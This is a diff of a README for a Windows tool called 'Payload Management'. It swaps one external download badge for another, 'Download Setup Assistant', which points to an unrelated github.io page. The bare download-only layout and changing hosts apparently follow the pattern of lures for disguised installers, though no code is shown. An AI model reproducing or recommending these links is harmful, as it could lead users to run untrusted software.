@@ -1,12 +1,6 @@
 <h1 align="center">🗂️ Payload Management (Windows)</h1>
 
-<p align="center">
-  <a href="https://payload-management-download-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Payload%20Management-Windows%20Version-2E8B57?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Payload Management for Windows" 
-         style="width: 540px; height: 43px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://mudseekurehastopp.github.io/.github/payload-management)
 
 ---
 
